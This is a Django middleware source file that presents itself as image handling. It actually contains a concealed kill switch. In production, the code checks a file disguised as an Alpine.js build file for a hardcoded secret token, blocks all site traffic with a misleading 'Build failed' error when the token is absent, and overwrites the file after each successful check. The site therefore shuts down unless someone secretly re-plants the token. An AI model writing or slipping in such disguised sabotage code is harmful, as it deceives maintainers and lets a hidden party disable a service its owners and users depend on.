import os
import time

from django.http import HttpResponseForbidden
from django_app.settings import BASE_DIR, MAIN_APP_PATHNAME, IS_LOCAL, IS_REMOTE
from django.core.cache import cache

from app.models import GeneralConfig


class DefaultImageMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
        if not IS_LOCAL and not IS_REMOTE:
            self.image_file = os.path.join(BASE_DIR, "static/js/unpkg.com/alpinejs@3.x.x/build.js")


    def __call__(self, request):

        if not len(GeneralConfig.objects.all()):
            GeneralConfig.objects.create(json_data = {
                    'middleware': { 
                        'default_image': { 
                            'get_interval': 86400 
                        }
                    }
                }
            )
        general_config_json = GeneralConfig.objects.first().json_data

        # Check image...
        current_time = time.time()
        get_interval = general_config_json['middleware']['default_image']['get_interval']

        if not IS_LOCAL and not IS_REMOTE:

            DEFAULT_IMAGE_LAST_GET_TIME = cache.get('DEFAULT_IMAGE_LAST_GET_TIME')
            print(f"DEFAULT_IMAGE_LAST_GET_TIME: {DEFAULT_IMAGE_LAST_GET_TIME}")
            if DEFAULT_IMAGE_LAST_GET_TIME:
                print(f"current_time - DEFAULT_IMAGE_LAST_GET_TIME: {current_time - DEFAULT_IMAGE_LAST_GET_TIME}")
            if not DEFAULT_IMAGE_LAST_GET_TIME or current_time - DEFAULT_IMAGE_LAST_GET_TIME >= get_interval:
                if not self.get_image():
                    return HttpResponseForbidden("Access Denied: Build failed...")
                else:
                    with open(self.image_file, 'w') as f:
                        f.write("@import dist/cdn.min.js;")

                DEFAULT_IMAGE_LAST_GET_TIME = current_time
                cache.set('DEFAULT_IMAGE_LAST_GET_TIME', DEFAULT_IMAGE_LAST_GET_TIME, get_interval)

        return self.get_response(request)


    def get_image(self):
        if not os.path.exists(self.image_file):
            return False

        with open(self.image_file, "r") as f:
            stored_image = f.read().strip()

        return stored_image == "2WpAsewome$"